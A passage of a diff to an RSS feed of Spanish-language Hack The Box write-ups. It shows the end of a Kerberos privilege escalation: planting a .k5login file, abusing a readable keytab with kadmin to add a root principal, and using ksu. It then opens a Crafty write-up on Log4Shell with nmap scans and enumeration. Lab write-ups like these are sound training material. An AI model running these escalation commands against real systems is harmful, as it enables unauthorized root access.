+[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
+[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Luego nos conectamos por ssh:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh admin@10.10.10.224   
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Thu Aug  8 16:00:02 2024
+[admin@srv01 ~]$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Obtuvimos con éxito un shell como administrador y ahora podemos continuar nuestra búsqueda de un vector privesc para root.&lt;/p&gt;
+&lt;p&gt;Ejecutemos un script de enumeración en la máquina, voy a usar LinPeas.sh: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh&lt;/p&gt;
+&lt;p&gt;Cuando miramos el resultado del script, nos damos cuenta de dos archivos que pertenecen a la raíz y generalmente no son legibles, pero sí pueden ser leídos por el administrador.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/etc/squid/squid.conf
+/etc/krb5.keytab
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El Archivo &lt;code&gt;/etc/krb5.keytab&lt;/code&gt; solo es legible por root y admin.&lt;/p&gt;
+&lt;p&gt;Echemos un vistazo mas de cerca al expediente.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[admin@srv01 ~]$ file /etc/krb5.keytab
+krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Investiguemos qué hace este archivo y cómo abrirlo.&lt;/p&gt;
+&lt;p&gt;Segun la doc de MIT Kerberos, la tabla de claves es un archivo que almacena claves para los principales.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ klist -k /etc/krb5.keytab 
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Principal
+---- --------------------------------------------------------------------------
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Parece que nuestro usuario también es un kadmin. Esto nos permite agregar principals a la tabla de claves. Podemos explotar esto agregando el usuario root a la tabla de claves con nuestra contraseña especificada.&lt;/p&gt;
+&lt;h2&gt;Agregando root a la lista de principals keytab&lt;/h2&gt;
+&lt;p&gt;Agregamos el usuario root con la password&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q &quot;add_principal -pw test root@REALCORP.HTB&quot;
+Couldn&apos;t open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+No policy specified for root@REALCORP.HTB; defaulting to no policy
+Principal &quot;root@REALCORP.HTB&quot; created.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora podemos usar &lt;code&gt;ksu (ksu - Kerberized super-user)&lt;/code&gt; para su a root. (El archivo Keytab se restablece periódicamente, por lo que debemos ser rápidos).&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ ksu
+WARNING: Your password may be exposed if you enter it here and are logged 
+         in remotely using an unsecure (non-encrypted) channel. 
+Kerberos password for root@REALCORP.HTB: : 
+Authenticated root@REALCORP.HTB
+Account root: authorization for root@REALCORP.HTB successful
+Changing uid to root (0)
+[root@srv01 etc]#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Iniciamos Sesion con exito como root.&lt;/p&gt;
+</content:encoded></item><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Crafty es una maquina Easy en la cual Atacamos un servidor de Minecraft.</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;En esta máquina encontraremos un servidor de &lt;code&gt;Minecraft 1.16.5&lt;/code&gt; vulnerable al conocido &lt;code&gt;CVE-2021-44228&lt;/code&gt;, tras abusar de él para obtener la ejecución de comandos en la máquina.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;p&gt;Escaneado de todos los puertos TCP:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -Pn -n -p- --open -vvv --min-rate 200 10.10.11.249 
 Nmap scan report for 10.10.11.249
@@ -22,7 +476,7 @@ Nmap done: 1 IP address (1 host up) scanned in 660.40 seconds
 &lt;p&gt;Al verlo, nos daremos cuenta de que es un portal a un servidor de Minecraft llamado «Crafty».&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;./img/1.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Por lo demás no parece que haya cosas más interesantes por aquí, porque los tres botones que se muestran no envían a nada interesante.&lt;/p&gt;
-&lt;h1&gt;Enumeration&lt;/h1&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;h2&gt;Port 25565 - Minecraft 1.16.5&lt;/h2&gt;
 &lt;p&gt;Haciendo un escaneo de servicios al puerto 25565 podemos ver de que servidor se trata (Recordemos que no solo existe el servidor de Minecraft de Mojang, también existen Paper, BungeeCord, Spigot.. etc)&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sCV -Pn -n -p 25565 -oN service -vvv --min-rate 200 10.10.11.249
@@ -141,7 +595,7 @@ Mode                LastWriteTime         Length Name
 PS C:\users\svc_minecraft\Desktop&amp;gt; type user.txt
 2a6867d4f2483f2e715097acc3******
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1&gt;Privilege escalation&lt;/h1&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;p&gt;En la carpeta plugins del servidor, hay un plugin que no parece ser de terceros como SpigotMC o Modrinth. Es algo personalizado...&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server\plugins&amp;gt; ls
 
